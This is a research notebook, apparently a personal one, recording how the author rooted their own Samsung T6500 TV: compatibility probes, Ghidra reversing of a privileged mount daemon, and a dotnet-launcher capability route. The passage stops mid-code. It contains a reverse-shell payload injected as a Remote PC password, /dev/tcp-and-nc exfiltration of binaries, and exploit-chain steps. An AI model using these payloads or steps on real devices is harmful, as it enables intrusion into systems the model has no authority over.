---
type: investigation
tags: [samsung, tizen, tv, root, kants2, uep, kernel-exploit, armv7l, dotnet, dotnet-launcher, aul, capabilities, remotepc, cifs, smack, ghidra, reverse-engineering, persistence, profile.d, raw-block, sdb]
created: 2026-10-23
last_verified: 2026-10-25
status: current
---

# Samsung TV root: from compatibility probe to UEP bypass and boot-persistent root (KantS2 / T6500)

> **Merged 2026-10-25** from seven separate docs into one chronological narrative:
> `samsung-tv-root-exploit-compatibility-probe.md`, `samsung-tv-remotepc-cifs-root-route.md`,
> `samsung-tv-archive-root-dotnet-launcher-route.md`, `samsung-tv-dotnet-launcher-standalone-invocation.md`,
> `samsung-tv-kernel-exploit-and-firmware-options.md`, `samsung-tv-uep-bypass-and-kants2-root.md`,
> `samsung-tv-t6500-persistent-root-boot-hook.md`. Each is now a chapter below, in the order the
> work actually happened. Debloat/launcher-curation work that root enabled lives in the companion
> doc [samsung-tv-t6500-debloat-and-launcher.md](samsung-tv-t6500-debloat-and-launcher.md); power
> states in [samsung-tv-t6500-power-states-and-remote-control.md](samsung-tv-t6500-power-states-and-remote-control.md).
>
> **Paths relocated (2026-10-25):** all local working dirs referenced below (`~/kants2-exploit`,
> `~/tv-src`, `~/samsung-tv-root-src`, `~/tvlab`, `~/tvtest`) moved to
> `~/archive/samsung-tv-t6500-2026-10/{exploit-src,tooling,infra}/`; `~/kdump_srv.py` and
> `~/uep_scan2.py` → `.../scripts/`; `~/kerneldump.bin` and the duplicate `~/ghidra_12.1.4_PUBLIC`
> → `.../duplicates/`. The live Ghidra install is `~/tools/ghidra_12.1.4_PUBLIC`
> (`GHIDRA_INSTALL_DIR` in `~/tools/rea-env.sh`).

## Target facts

Samsung **UA43T6500AKXXD** (2020 T6500, firmware tag `20_KANTS2_FHD`), SoC Novatek NT72172,
Tizen 5.5, armv7l hard-float, kernel `4.1.10` build `T-KTS2UABC-REL-202607281700`, no KASLR
(`PAGE_OFFSET 0xC0000000`). `192.168.50.31`, MAC `64:E7:D8:EC:38:EE`. Host: fedora,
`192.168.50.20`.

## Result, up front

Root and UEP bypass are **done** (Chapter 6) and **boot-persistent** (Chapter 7): the TV executes
root code ~1 s after every power-on, no computer/sdb/exploit required. Getting there took six
dead-or-partial routes (Chapters 1–5) before the one that worked.

| Chapter | Route | Outcome |
|---|---|---|
| 1 | `chris-ritsen/samsung-tv-root`, as published | ❌ all 3 escalation routes fail compatibility (wrong arch/kernel/caps) |
| 2 | Remote PC / CIFS credential injection (`ps_agent` policy reversed) | ✅ working one-shot root, UI-driven |
| 3 | `archive-root` via `dotnet-launcher` (chris-ritsen method adapted) | ⏳ viable in principle, invocation unsolved at this point |
| 4 | `dotnet-launcher --standalone` invocation, solved from Tizen source | ✅ unlocks cap-bearing managed code, no UI needed |
| 5 | Kernel-side exploit survey (`ntksys`, `/dev/sdp_mem`, Mali kbase) | ❌ the two published kernel chains are both patched/unreachable here |
| 6 | `/dev/ntkhdma` physmap + UEP state-word flip | ✅ **root achieved**, ~150 ms fast path |
| 7 | Raw-block patch of a boot-sourced `profile.d` script | ✅ **boot-persistent root achieved** |

---

## Chapter 1 — Compatibility probe: chris-ritsen/samsung-tv-root against an unlisted model

*Historical — superseded by Chapter 2. Kept as the record of the negative probe.*

Goal: check whether [chris-ritsen/samsung-tv-root](https://github.com/chris-ritsen/samsung-tv-root)
(owner-authorized root research tooling) works on this TV out of the box. This is a negative
result, not a how-to: all three of the project's root routes failed its own compatibility check,
and nothing beyond that read-only check was run.

The project's compatibility table only lists QN90B and QN90F as owner-tested, plus a few other
models with partial reports. It explicitly says results are for exact model/firmware pairs, not a
whole product line. Nothing in it names Tizen 5.5 or this model.

### What was and wasn't run

The tool has a shared entry-point bug plus three escalation routes (`qn90b`, `qn90f`,
`archive-root`). `preflight <model> <ip>` and `archive-root probe <ip>` only exercise the entry
point and a read-only compatibility check — they report what the TV is, without running the
actual escalation stage or installing anything. That's as far as this went.

### Setup

```bash
git clone https://github.com/chris-ritsen/samsung-tv-root.git ~/samsung-tv-root-src
cd ~/samsung-tv-root-src
python3 -m venv .venv && .venv/bin/pip install -e .
make payloads          # builds fine on .NET 9 SDK targeting net6.0
samsung-tv-root config init
# edit ~/.config/samsung-tv-root/config.toml: host = <tv-ip>, root_on_presence = false
samsung-tv-root config check
"$SDB" connect "$TV_IP:26101"; "$SDB" devices
```

One payload variant (`common31-payload`, for TVs whose on-device .NET runtime is only 3.1) failed
to build: its `global.json` pins an SDK version that wasn't installed. Not needed for this probe;
`doctor` reports "Ready: no" solely because of that one missing variant.

### Result

The first probe attempts all failed the same way: the TV's callback to the host (on a random
port) was blocked by the local firewall, not by incompatibility. Opening one fixed port for the
callback, then closing it again right after, let the probes complete and get real data back from
the TV.

Each of the three routes then reported a clear mismatch between what it needs and what this TV
actually is:

- One route needs a 64-bit CPU architecture; this TV is 32-bit.
- Another needs a newer kernel and a vendor build this TV doesn't have.
- The third needs capability bits on the on-device runtime that aren't set here.

In short: the entry-point bug itself appears to apply to this older, 32-bit firmware, but none of
the three escalation routes in this project do — each one is built against hardware/software
assumptions this TV doesn't meet.

### Why nothing further was attempted

These were hard platform mismatches (wrong CPU architecture, wrong kernel generation, missing
runtime capabilities), not marginal ones. The project's own documentation says a failed attempt
can leave a TV in an unexpected state with no documented recovery. The read-only check already
answered the compatibility question using the TV's own reported data, so there was nothing left to
responsibly test further.

**Conclusion:** not usable on this exact model/firmware as-is. Supporting it would mean new
exploit-development work for this specific kernel/architecture, not running the existing payloads.
That work is what Chapters 2–6 below actually did.

---

## Chapter 2 — The Remote PC / CIFS route, and the binary policy that gates it

*The working one-shot root route — current.*

Follow-up to Chapter 1's negative probe. This is the route that actually applies to this
firmware, and the reverse-engineering that shows exactly why it is the only route.

### Where the earlier routes died

- **Kernel physmap (`ntksys`)** — califio/MADBugs' chain for the same `20_KANTS2_FHD` family no
  longer works here. `ioctl` still round-trips (`SET_MEM_INFO` echoes `start=0x02000000
  size=0x1000`, `GET_BUFF_ADDR` -> `phys=0x93040000`), but `mmap()` on `/dev/ntksys`,
  `/dev/ntkmem`, `/dev/ntkxdma` and `/dev/mali0` returns `MAP_FAILED` at every offset, size and
  protection. `/dev/ntkhdma` and `/dev/ntkgpu` map but ignore the offset. `/dev/mem` and
  `/dev/kmem` are absent. This matches tiz0wn's description of `check_mmap_area_is_valid`
  hardening.
- **Unsigned code execution** — UEP refuses unsigned ELF on every writable filesystem (`file
  /tmp/h is not signed. Sign it.(fsname:tmpf)`), including when loaded through
  `/lib/ld-linux.so.3`. Managed code is the way in: a `tz pack`-signed TPK installs and runs
  (`0 appinstall tpk`, `0 execute`), giving uid 5001 / gid 100 with SMACK label
  `User::Pkg::<package>`, and .NET can reach libc via `NativeLibrary.Load` +
  `Marshal.GetDelegateForFunctionPointer`.

Two footholds were kept:

| foothold | identity | how |
|---|---|---|
| sdb injection shell (SVE-2025-50109, `0 appinstall tpk <inj>`) | uid 901 `sdk`, SMACK `System` | one-shot commands, intermittently returns empty |
| signed TPK app `samudntest01.DnTest` | uid 5001, SMACK `User::Pkg::samudntest01` | outbound TCP shell to 192.168.50.20:9999 (`tvshell.py` + `shellsrv.cs`) |

### The Remote PC / CIFS root bug

`/usr/apps/privileged-service/bin/mount.smb.sh` ends with

```sh
/bin/bash -c "$UTIL $UTIL_OPT"
```

and `UTIL_OPT` is assembled from the credential file that Remote PC writes (`username=`,
`password=`, `smbpath=`). The contents are not shell-escaped, so a command substitution in either
field is evaluated **as root** when the TV mounts a share. Same bug class as tiz0wn's
`research/remotepc-cifs-root`.

The guard is `com.safe.ps_agent` on the system bus, `CallCommand(s,s,i,i)`. Every call is refused
unless the caller matches a credential compiled into the daemon — which is what this session
reverse-engineered.

### Reversing ps_agent with rea + Ghidra

Toolchain note: **rea needs the Ghidra 12.1.x line** (12.2 is rejected outright) plus a full JDK,
not a JRE. On Fedora 43:

```bash
sudo dnf install -y java-25-openjdk-devel
curl -LO https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_12.1.4_build/ghidra_12.1.4_PUBLIC_20260921.zip
unzip -q ghidra_12.1.4_PUBLIC_20260921.zip
export GHIDRA_INSTALL_DIR=$HOME/ghidra_12.1.4_PUBLIC JAVA_HOME=/usr/lib/jvm/java-25-openjdk
export PATH=$JAVA_HOME/bin:$PATH

rea analyze   /tmp/ps_agent --format json
rea search    /tmp/ps_agent "check credential" --format json
rea xrefs     /tmp/ps_agent <string-address> --format json
rea decompile /tmp/ps_agent <function-address> --format json   # pseudocode in .normalized_result
```

Function addresses came from the dynamic symbol table (`arm-linux-gnu-nm -D -C --defined-only
/tmp/ps_agent`) because the binary is stripped of static symbols but keeps exported C++ symbols:

| symbol | addr |
|---|---|
| `PS_Executor::Execute` | logged at 0x44xxx |
| `PS_CredentialManager::MatchAuth` | 0x2d2f8 |
| `PS_AuthInfo::Match` | 0x2d198 |
| `PS_AuthInfo::PS_AuthInfo` (regex compile) | 0x2d700 |
| `PS_Rule::Match` | 0x3383c |
| `PS_CredentialManager::PS_CredentialManager` | 0x2fe1c |
| `PS_CredentialManager::GetCredentials` | 0xef6c |

#### What Execute does

`PS_Executor::Execute` reads the caller pid (`Auth::GetCallerPid`), then `Auth::GetPath`
(`/proc/<pid>/exe`) and `Auth::GetSmackLabel` (`/proc/<pid>/attr/current`), builds a
`PS_AuthInfo(smack, path)`, and asks `PS_CredentialManager::MatchAuth` for the credentials whose
auth info matches. On failure it logs

```
check credential for pid:%d agent: %s path: %s smack: %s available credential: %d
```

which is the line seen for every rejected call (`path: /usr/bin/dbus-send smack: System available
credential: 0`).

#### The comparison is anchored, not substring

`PS_AuthInfo::Match` compiles both stored regexes (`boost::basic_regex::do_assign`) and calls the
wrapper at `0x3ca54` twice — once for label, once for path. The wrapper is an inlined
`boost::regex_match`: after `perl_matcher::match_prefix` it returns true only when the match
**starts at the beginning and ends at the end of the input**:

```c
iVar22 = perl_matcher::match_prefix(&local_a8);
if (iVar22 != 0) {
    pvVar12 = *local_a8; pvVar8 = local_a8[1];
    ...
    if (ppvVar16[1] == local_98) {          /* match end == input end   */
        ...
        bVar20 = *ppvVar16 == local_9c;     /* match start == input start */
    }
}
```

So the caller must match **exactly** — no substring, no prefix, no suffix trick. (The same
decompile pass also proves `MatchAuth` has no fallback path: it walks the credential vector and
calls `PS_AuthInfo::Match` for each entry.)

#### The compiled credential for ps_mount_cifs

`.rodata` (vaddr == file offset, 0x353a8..0x3e494) holds the table, and the key strings are
`ps_insmod` (0x358dc), `ps_mount` (0x38d84), `ps_mount_cifs` (0x38f54), `ps_umount` (0x39af0),
`ps_umount_cifs` (0x39b5c), `ps_mknod` (0x39bbc), `ps_rmmod` (0x39bf4), `ps_systemctl` (0x39c54).
The SMB credential appears in the block ending just before the `ps_mount_cifs` key:

```
0x38dab  label regex  User\:\:Pkg\:\:org\.tizen\.remotepc
0x38dab  path  regex  \/usr\/apps\/org\.tizen\.remotepc\/bin\/remotepc\_uilauncher
0x38df4  arg   regex  ^\-o\s+credentials\=\/tmp\/[A-Za-z0-9_.:-]+\,vers\=[A-Za-z0-9_.:-]+\s+\/\/192\.168\.0\.13\/\[\:SMBPATH\:\]\s+...
0x38e9c  arg   regex  ^\-o\s+ro\,nosuid\,noexec\,nodev\,credentials\=\/tmp\/[A-Za-z0-9_.:-]+\,vers\=2\.1\s+\/\/[A-Za-z0-9_.:-]+\/\[\:SMBPATH\:\]\s+\/opt\/usr\/home\/owner\/content\/smb\/\[\:SMBPATH\:\]$
0x359f0  /usr/bin/launchpad-loader  -> belongs to the Netflix rule, NOT Remote PC
```

Points that matter:

- The host in the mount argument is a **character class**, `[A-Za-z0-9_.:-]+`, so the target PC
  can be any LAN address. The literal `192.168.0.13` rule is a different, narrower entry.
- `vers=2.1` is mandatory, and the credential file must be `/tmp/<name>`.
- `launchpad-loader` is often quoted as a second allowed caller; it is not — it is paired with
  `User::Pkg::org.tizen.netflix-app` in the Netflix rule.
- The policy is compiled in. A grep for `ps_mount_cifs` across `/usr/apps`, `/opt/usr`,
  `/usr/share` and `/etc` returns only the `ps_agent` binary itself; there is no XML/config to
  edit.

Attribute that block to `ps_mount` rather than `ps_mount_cifs` and it changes nothing for the
attacker: both keys are only reachable from the same process, and this is the only credential in
the whole table that carries an SMB `credentials=` argument with a caller-supplied host. Exact
key-level attribution could not be settled further — `PS_CredentialManager::GetCredentials`
(0xef6c) fails to decompile (`rea`: `Analysis failed`) and `.data.rel.ro` contains no pointers to
these strings, so the table is built at runtime by that function and the grouping above rests on
`.rodata` layout adjacency.

#### The rest of the table (why no other agent is reachable)

Every other credential pair in `.rodata` is equally app-specific and equally unreachable from uid
901 (`System`) or from our own TPK app (`User::Pkg::samudntest01`):

| label | path | serves |
|---|---|---|
| `User::Pkg::org.tizen.ep-hotel-hms` | `/opt/usr/apps/org.tizen.ep-hotel-hms/bin/` | loading usbserial/cp210x/cdc-acm/ftdi_sio modules |
| `System::Privileged` | `/usr/apps/com.samsung.tv.nfc-daemon/bin/...`, `/usr/bin/gatorDir/tztv-tagpro-*` | NFC + tagpro kernel modules |
| `User::App::org.tizen.netflix-app` / `User::Pkg::org.tizen.netflix-app` | `/usr/apps/org.tizen.netflix-app/bin/netflix-app`, `/usr/bin/launchpad-loader`, `/usr/bin/node`, `/usr/bin/wrt-service`, `.../wrt-service-standalone`, `/usr/bin/wrt` | loop-mounts of `empNetflix.img`, `*.tmg`, `wsa` images |
| (remotepc) | `/usr/apps/org.tizen.remotepc/bin/remotepc_uilauncher` | the SMB/CIFS mount |

The remaining `mount`-shaped rules (`^/tmp/[A-Za-z0-9_.:-]+$`, `^-l /tmp/...$`,
`^/opt/usr/apps/<pkg>/res/wgt$`) belong to those same app credentials, not to a generic agent, so
knowing them does not add a route.

Consequence: `dbus-send`, `busctl`, the sdk shell (SMACK `System`) and our own TPK app can never
satisfy this. The agent name, the label and the exact executable path only line up inside the
genuine Remote PC UI process.

### Who actually issues the mount

From `remotepc_rdp`, `remotepc_uilauncher` and `remotepc_manager`:

1. `remotepc_rdp` sends an EFL-IPC bundle `OPERATION=SAMBA_MOUNT` to the launcher
   (`efCreateMessageTemplate("org.tizen.remotepc.client","org.tizen.remotepc.ui")`).
2. The launcher (`remotepc_uilauncher`, the one process whose exe path and SMACK label both match
   the credential) handles it in its RDP/VNC session threads: reads the host and username from
   the profile DB, reads the password from SecureStorage key `RemotePCPassword`, then
   `Samba::Connect`.
3. `Samba::Connect` checks the host is in the local subnet, `mkdir`s
   `/opt/usr/home/owner/content/smb`, calls `smb2_scan_init(host,user,pass)`, and for every share
   not ending in `$` writes a `tmpnam()` credential file (`username=`, `password=`, `smbpath=`)
   and calls `PS_Mount_Cifs` with `-o ro,nosuid,noexec,nodev,credentials=<tmp>,vers=2.1
   //<host>/<share> /opt/usr/home/owner/content/smb/<share>`.
4. That call reaches `ps_agent`, matches the one credential, and `mount.smb.sh` evaluates the
   password through `/bin/bash -c`.
5. The credential file is removed right after the mount attempt.

So the payload is typed **once**, as the Remote PC profile password — the Shared Folder step
reuses the stored `RemotePCPassword`. `remotepc_manager` cannot produce a mount at all: its
`messageHandler` only echoes `SAMBA_NOTALLOWED`/`SAMBA_SUBNETERR` based on a caller-supplied
`RESPONSE` string and `execv`s the RDP/VNC clients.

### Lab built to make the UI flow succeed

The TV only writes the credential file after an SMB enumeration with those exact credentials, and
the RDP login has to succeed first, so both services must accept a payload-shaped password. On
fedora, two rootful podman containers with host networking (`~/archive/samsung-tv-t6500-2026-10/infra/tvlab`,
`setup.sh` / `teardown.sh` / `verify_all.sh`):

- `tvlab-xrdp` — xrdp 0.9.21 + xrdp-sesman + Xvnc, session = xterm, port 3389.
- `tvlab-samba` — samba 4.17, SMB2+, standalone, `[share] -> /srv/share`, `valid users = tvuser`,
  port 445.
- Password file `tvlab/pw` is `root:root 0600`, mounted read-only at `/run/tvlab-pw` and fed to
  `chpasswd`/`smbpasswd -s` on stdin, so it never appears in an argument list.

Payload used as the literal password (45 chars):

```text
$(bash -i >&/dev/tcp/192.168.50.20/4444 0>&1)
```

Verified (captured in `tvlab/VERIFY.txt`):

- `smbclient -L //192.168.50.20 -U 'tvuser%<password>'` -> share listed, exit 0; authenticated
  listing of `//192.168.50.20/share` -> exit 0; control with a wrong password ->
  `NT_STATUS_LOGON_FAILURE`, exit 1.
- `pamtester` against `/etc/pam.d/xrdp-sesman` -> `successfully authenticated` exit 0; wrong
  password -> `Authentication failure` exit 1.
- Real RDP login -> server side `++ created session (access granted): username tvuser` with Xvnc
  on `:10`.
- Raw X.224 probe -> TPKT + Connection Confirm (`0xD0`).
- Trap on `:4444` armed during both logins -> no connection (the payload string is not evaluated
  by the services), and a deliberate redirection does trigger it, so the trap demonstrably works.

Firewall: the TV reaches every port on fedora because `trusted` has the source `192.168.50.31`
(`firewall-cmd --zone=trusted --add-source=192.168.50.31`). Runtime only — it does not survive
`firewall-cmd --reload` or a reboot.

### Gotchas found along the way

- **No `timeout` on the TV.** Port probes written as `timeout 3 bash -c "echo >/dev/tcp/..."`
  return "blocked" for every port simply because the binary does not exist. Check `command -v
  timeout` first.
- **The TPK app's sandbox has almost no filesystem.** Inside the app, `/usr/bin` contains only
  `csapi-tv-tizenfx`, `dotnet-launcher`, `ls`, `ps`, `sh`, `zone-init` — no `bash`, `cat`, `head`,
  `sed`, `dlogutil`. The `sh` there is not bash, so `/dev/tcp` redirection fails and app-side
  network tests are meaningless. The app's own .NET sockets work fine.
- **`sdb shell` is unreliable** (`intershell_support:disabled`): commands frequently return empty
  while `sdb capability` and `sdb shell "0 execute <appid>"` keep working.
- `sdb pull` is denied for `/usr/sbin/sdbd-tarlauncher` and `/tmp` paths (`You cannot pull files
  from this path`); exfiltration went through `/dev/tcp` + `gzip -9c | base64` to `nc` listeners
  instead.
- The decompiler wrapper returns pseudocode as a string in `.normalized_result`, not in a
  `pseudocode`/`code` field — parse accordingly.

### Status at the time (superseded by Chapter 6)

Everything up to the UI action was prepared and verified: the target knew the policy, the lab was
up, the listener was armed (`rootlisten.py`, port 4444, proof written to
`kants2-exploit/root_proof.txt`). The remaining step was human: on the TV, `Smart Hub -> Source ->
Remote Access -> Remote PC -> User -> Add` with host `192.168.50.20`, user `tvuser`, password
`$(bash -i >&/dev/tcp/192.168.50.20/4444 0>&1)`, then the shared-folder icon in the session's top
bar — that click is what fires `mount.smb.sh` as root. This route is UI-driven (one Shared Folder
click per root, and the click toggles mount/unmount, so a clean re-trigger needs a fresh RDP
session), which is why Chapters 3–6 kept looking for a route that needs no UI interaction at all.

### Files

- `~/archive/samsung-tv-t6500-2026-10/infra/tvlab/` — lab (`Containerfile.xrdp`, `xrdp.ini`,
  `entry-xrdp.sh`, `Containerfile.samba`, `smb.conf`, `entry-samba.sh`, `setup.sh`, `teardown.sh`,
  `verify_all.sh`, `README.md`, `VERIFY.txt`, `pw`)
- `~/archive/samsung-tv-t6500-2026-10/exploit-src/kants2-exploit/` — `tvsh.py` (sdb injection
  shell), `tvshell.py` + `dntest/Program.cs` (`shellsrv.cs`, TCP shell in the signed TPK),
  `rootlisten.py` (root callback catcher), `root_proof.txt`
- `~/archive/samsung-tv-t6500-2026-10/infra/tvtest/deploy.sh <version>` — build, zip, `tz pack`,
  push, `appinstall`
- exfiltrated binaries for RE: `/tmp/ps_agent`, `/tmp/remotepc_uilauncher`,
  `/tmp/remotepc_manager`, `/tmp/remotepc_rdp`
- decompiler: `~/tools/ghidra_12.1.4_PUBLIC` + `rea`

### References (Chapter 2)

- [sebastianspicker/tiz0wn](https://github.com/sebastianspicker/tiz0wn) — `research/remotepc-cifs-root/` (README, DISCLOSURE, LIVE-CHECKPOINT) and `docs/firmware-analysis.md`: the Remote PC/Shared Folder -> `mount.smb.sh` -> root finding
- [morluto/rea](https://github.com/morluto/rea) — Ghidra-backed analysis CLI used for the decompilation
- [califio/MADBugs](https://github.com/califio/publications) — the `ntksys` physmap chain, dead on this firmware

---

## Chapter 3 — The archive-root (dotnet-launcher) route is viable on Tizen 5.5

*In-progress at the time — the open item here is resolved in Chapter 4.*

### TL;DR

The `archive-root` method from `chris-ritsen/samsung-tv-root` (re-verified on Tizen 9.0 by
`DemonKingSwarn/samsung-tv-tizen-root`) **is viable on this Tizen 5.5 TV**. Chapter 1's probe
rejected it because it checks `/usr/bin/dotnet`, which does not exist here — the actual
capability-bearing launcher is `/usr/bin/dotnet-launcher`. All prerequisites are present. The only
open item is the exact direct invocation of `dotnet-launcher` that runs a managed DLL *with*
`CAP_SYS_ADMIN` retained — answered in Chapter 4.

### The chain (from chris-ritsen + Swarn)

1. SDB package-name injection (SVE-2025-50109) → uid 901 sdk shell (already have).
2. Run a managed assembly through a binary carrying `cap_sys_admin`.
3. In managed code: `unshare(CLONE_NEWNS)` + `mount --make-rprivate /`, then bind-mount our own
   `public.pem` over `/usr/share/sdbd/public.pem` and our own `passwd` over `/etc/passwd`.
4. Invoke `/usr/sbin/sdbd-tarlauncher --package_name X -xzf <our.tar.gz> --to-command=/bin/sh` —
   it verifies the archive signature against the (bind-mounted) key and runs `launch.sh` **as
   root**.
5. `launch.sh` execs a root agent that calls back over an HMAC channel.

No kernel bug, no memory corruption, no signature forgery.

### Verified prerequisites on this TV

| prereq | state |
|---|---|
| `getcap /usr/bin/dotnet-launcher` | `cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_mac_override,cap_mac_admin +eip` ✅ |
| `getcap /usr/bin/dotnet-launcher-inhouse` | `cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_mac_override,cap_mac_admin +ei` ✅ |
| `getcap /usr/sbin/sdbd-tarlauncher` | `cap_setgid,cap_setuid +eip` ✅ |
| `tar --to-command` | supported ✅ |
| `/usr/share/sdbd/public.pem` | present (451 bytes) ✅ |
| .NET runtime | `3.0.0` only (`/usr/share/dotnet/shared/Microsoft.NETCore.App/3.0.0`); no `/usr/bin/dotnet`, no 3.1/6.0 |
| sdk shell `CapEff` | `0000000000000000` (empty), `CapBnd=0000003fffffffff` (full bounding set) |

`.NET 3.0` is the one real deviation from upstream: chris-ritsen ships net6.0 and netcoreapp3.1
payloads. A netcoreapp3.0 build is required (the host .NET 9 SDK builds netcoreapp3.0 fine —
verified with a `captest` probe DLL).

### The blocker: caps are dropped by the app framework

Two ways to run managed code were tested:

1. **As a signed TPK app** (`samudntest01.DnTest`, `type="dotnet"`, `exec="dntest.dll"`). When
   launched, the app process reports `Uid: 5001`, `CapEff: 0000000000000000`, `CapBnd:
   0000000300200040`. The app framework invokes `dotnet-launcher` with `__AUL_TARGET_UID__=5001`,
   and the resulting `setuid(5001)` clears all capabilities. **Dead end for caps**, but proves a
   plain `static int Main()` console assembly runs fine under `dotnet-launcher`.
2. **Directly as uid 901**: `dotnet-launcher <dll>` and `dotnet-launcher --standalone <dll>` both
   return `rc=0` but produce no output and do not execute the DLL's `Main` (no `HELLO` from the
   probe). The exact argument contract is not yet reverse-engineered at this point.

#### Captured launch format (from `/proc/<pid>/cmdline` of the running app)

```
dotnet-launcher samudntest01.DnTest --standalone /opt/usr/apps/samudntest01/bin/dntest.dll \
  `zaybxcwdveuftgsh` \
  __AUL_STARTTIME__ <b64> __AUL_TARGET_UID__ <b64=5001> __APP_SVC_PKG_NAME__ <b64> \
  __AUL_CALLER_PID__ <b64> __AUL_CALLER_UID__ <b64=5001> __K_RELOCATE_BELOW <b64> \
  __K_SPLASH_SCREEN <b64> Title <b64> IconPath <b64> USE_DISKCACHE <b64> \
  __AUL_HWACC__ <b64> __AUL_ROOT_PATH__ <b64=/opt/usr/apps/samudntest01> \
  __AUL_INTERNAL_POOL__ <b64> __AUL_API_VERSION__ <b64=5.5> __AUL_IS_GLOBAL__ <b64> \
  __AUL_INSTALLED_STORAGE__ <b64=internal>
```

argv[0] is the appid. The `__AUL_*` values are base64 of a Tizen bundle
(`<len><type><name><value>`). `--standalone <dll>` is the entry assembly.

### Progress at this point on the invocation (superseded by Chapter 4)

- The `__AUL_*` values decode to a Tizen bundle entry: `<u32 total_len><u32 0x401><u32
  name_len><name\0><u32 val_len><value\0>`, base64-encoded. A Python helper reconstructs them
  (e.g. `__AUL_ROOT_PATH__` for the staging dir).
- **argv[0] is the appid** (the app framework execs with argv[0] = `samudntest01.DnTest`, not
  `dotnet-launcher`). Running the binary directly (`argv[0]=dotnet-launcher`, args `captest
  --standalone <dll> …`) returns rc=0 and runs nothing. Running with `exec -a captest …` (argv[0]
  set to the appid) changes the result to rc=1 — so argv[0] is parsed, and the launch is now
  attempted but still fails (missing token / more `__AUL_*` keys).
- The magic token `` `zaybxcwdveuftgsh` `` (literal backticks) was the next candidate to add; it
  had to be escaped when the command passes through bash.
- `dotnet-launcher` logs to `/tmp/dotnet_error.<pid>.<ts>.log` (usually empty).

Chapter 4 shows this whole line of effort (bundle decoding, the magic token, argv[0] tricks) was
unnecessary — the real answer came from reading Samsung's own source, not from reverse-engineering
the binary further.

### Fallback kept at this point

The Remote PC/CIFS route (Chapter 2) already produced a verified uid=0 callback. It is UI-driven
(one Shared Folder click per root) and the click toggles mount/unmount, so a clean re-trigger
needs a fresh RDP session. Kept as the fallback while this route was unsolved.

### Files / artifacts

- `~/archive/samsung-tv-t6500-2026-10/tooling/samsung-tv-root-src/` — chris-ritsen checkout
  (`src/samsung_tv_root/archive_root.py`, `payloads/common/SamsungTvArchiveRoot.cs`,
  `payloads/common31/`)
- `/tmp/swarn-root/` — `DemonKingSwarn/samsung-tv-tizen-root` checkout (`ROOTING-RESEARCH.md`,
  `tools/`, `evidence/`)
- `/tmp/captest/` — netcoreapp3.0 probe DLL (`Program.cs` prints `/proc/self/status` caps; pushed
  to `/home/owner/share/tmp/sdk_tools/captest/`)
- `~/archive/samsung-tv-t6500-2026-10/exploit-src/kants2-exploit/` — `tvsh.py` (uid 901 injection
  shell), `tvshell.py` (TPK TCP shell), `rootlisten.py` (root callback catcher, port 4444),
  `dntest/`

### References (Chapter 3)

- [chris-ritsen/samsung-tv-root](https://github.com/chris-ritsen/samsung-tv-root) — archive-root method, payloads, root-agent protocol
- [DemonKingSwarn/samsung-tv-tizen-root](https://github.com/DemonKingSwarn/samsung-tv-tizen-root) — independent Tizen 9.0 reproduction + the three model adaptations (§6 of `ROOTING-RESEARCH.md`)
- [sebastianspicker/tiz0wn](https://github.com/sebastianspicker/tiz0wn) — Remote PC/CIFS route (fallback), Mali CVE dead ends
- [califio/MADBugs](https://github.com/califio/publications) — ntksys physmap chain, dead on this firmware

---

## Chapter 4 — The `dotnet-launcher` standalone invocation, solved from Tizen source

*Current. Answers Chapter 3's open item.*

Chapter 3 left one open item: the exact `dotnet-launcher` invocation that runs a managed DLL
*with* its file capabilities intact. That item is now answered — not by decompiling the 61 KB
binary, but by reading Samsung's published source for it.

### TL;DR

`dotnet-launcher --standalone <dll>` is gated by two `aul` calls that are fatal on failure, and
**both short-circuit on environment variables** (`AUL_APPID`, `AUL_ROOT_PATH`). With those set, an
unprivileged `uid=901` process can run a managed assembly inside the cap-bearing launcher without
app-service, without the app database, and without a UI. That is the missing first step of the
archive-root chain on a TV that has no `/usr/bin/dotnet`.

### Where the answer came from

Samsung ships the real source in Tizen snapshot source RPMs. For Tizen 5.5:

```sh
BASE=https://download.tizen.org/snapshots/TIZEN/Tizen-5.5/Tizen-5.5-Unified/latest/repos/standard/source
curl -sLO $BASE/dotnet-launcher-3.1.0-1.src.rpm
curl -sLO $BASE/aul-0.23.7-1.src.rpm
rpm2cpio dotnet-launcher-3.1.0-1.src.rpm | cpio -idmv   # dotnet-launcher-3.1.0.tar.gz + .spec + .conf
rpm2cpio aul-0.23.7-1.src.rpm            | cpio -idmv   # aul-0.23.7.tar.gz + manifest + .spec
```

Extracted on fedora at `~/archive/samsung-tv-t6500-2026-10/exploit-src/tv-src/dotnet-launcher-3.1.0`
and `tv-src/aul-0.23.7` (60 and ~300 files respectively). This is faster and more reliable than RE:
five minutes of reading versus a Ghidra session, and it is authoritative.

### Parity check: the live binary is this code

Two independent confirmations that the Tizen 5.5 source matches the TV binary (exfiltrated
earlier to `/tmp/dotnet-launcher`, 61,782 bytes, ELF 32-bit ARM, not stripped):

```text
$ arm-linux-gnueabihf-nm -C /tmp/dotnet-launcher | grep -e " T main" -e Option
0000331c T main
0001a408 b PaddingOption
0001a3f0 b StandaloneOption

$ rea decompile /tmp/dotnet-launcher 0x331c --format json   # .normalized_result
void main(undefined4 param_1,undefined4 param_2)
{
  realMain(param_1,param_2,"default");
  return;
}
```

`realMain(argc, argv, "default")` is `NativeLauncher/hydra/hydra_main.cc`'s shape
(`dotnet-hydra-loader` → `dlopen` the launcher plugin → `realMain`), and
`StandaloneOption`/`PaddingOption` are the two file-static strings in
`NativeLauncher/launcher/exec/launcher.cc`. The binary also carries that file's `_INFO` strings
verbatim: `##### Run in standalone mode #####`, `AUL_APPID : %s`, `Run in standalone mode`.

### What `--standalone` does (launcher.cc)

```c
static std::string StandaloneOption("--standalone");
for (int i = 1; i < argc; i++) {
    if (StandaloneOption.compare(argv[i]) == 0) { i++; standalonePath = argv[i]; }
    else if (PaddingOption.compare(argv[i]) == 0) { paddingExist = true; }
    else { vargs.push_back(argv[i]); }          // <-- every unknown arg is an app arg
}

std::unique_ptr<CoreRuntime> runtime(new CoreRuntime("standalone"));

if (AUL_R_OK == aul_app_get_appid_bypid(getpid(), appId, sizeof(appId))) {
    appRootPath = aul_get_app_root_path();
    if (appRootPath == nullptr) { _ERR("Fail to get application root path"); return -1; }
} else { _ERR("Fail to get app_id"); return -1; }     // <-- both gates are fatal
...
runtime->initialize(LaunchMode::launcher);
